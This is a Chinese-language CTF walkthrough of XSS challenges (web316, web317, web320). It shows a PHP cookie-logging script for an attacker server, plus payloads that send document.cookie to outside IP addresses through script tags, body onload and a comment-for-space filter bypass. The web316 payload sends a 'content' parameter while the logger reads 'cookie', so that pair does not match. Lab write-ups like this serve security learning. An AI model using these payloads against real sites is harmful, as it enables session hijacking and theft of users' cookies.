# XSS

- 要想获得flag，需要在服务器上创建x.php，同时需要运行x.php这个程序，`php x.php`（为什么呢？）

## web316

:::info

<script>标签中可以写js的代码
:::
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671698837465-d25ed447-52f5-4dc8-888f-b3251c53eb6b.png#averageHue=%23faf8f6&clientId=uaede88a3-3ef2-4&from=paste&height=201&id=u93a8658d&originHeight=402&originWidth=2348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38430&status=done&style=none&taskId=u92a3d528-8ff0-46cd-82d6-8059d1ba6aa&title=&width=1174)


- 这里flag藏在document.cookie中。所以为什么呢？
- 能否直接显示document.cookie呢？发现不行，因此得尝试带出来

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671698946887-b4d54e1c-d177-4e97-aeda-a221109a5437.png#averageHue=%23fef8f7&clientId=uaede88a3-3ef2-4&from=paste&height=86&id=bQgLU&originHeight=171&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24575&status=done&style=none&taskId=ueda47460-1c8d-4fdd-96f9-2fa0a59c8da&title=&width=629)

- 在服务器上创建如下脚本

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>

```

- 在生成链接处，让它跳转到我构造的页面x.php，并在cookie.txt中写入document.cookie

```javascript
<script>document.location.href="http://49.233.18.145/x.php?content="+document.cookie</script>
```

:::info
[https://www.cnblogs.com/Qian123/p/5345298.html#_label3](https://www.cnblogs.com/Qian123/p/5345298.html#_label3)<br />document.location.href是跳转的链接。
:::

## web317 绕过<script>

### <body onload>

[Body onload 事件 | 菜鸟教程](https://www.runoob.com/jsref/event-body-onload.html)
:::info
onload中也可以执行js代码，会在显示完页面的内容后，执行
:::

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"> 
<title>菜鸟教程(runoob.com)</title>
<script>
function load()
{
	alert("页面已经载入！");
}
</script>
</head>

<body onload="load()">
<h1>Hello World!</h1>
</body>

</html>
```

- 代码的执行结果：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678067566100-d34b761b-1886-4b57-a41e-8956d1ee1d25.png#averageHue=%23f2f2f1&clientId=u39157e5c-4c6c-4&from=paste&height=339&id=yW9AN&originHeight=677&originWidth=1155&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45963&status=done&style=none&taskId=ubf3c8742-6df7-40b7-8cf4-5d9647e2421&title=&width=577.5)

- payload如下：

```javascript
 <body onload="document.location.href='http://49.233.18.145/x.php?1='+document.cookie"></body>
```

## web 320(绕过空格)

- 把web317的payload的空格改成注释即可

```html
<body/**/onload="location.href='http://119.3.134.252:8002/a.php?cookie='+document.cookie"></body>
```

# 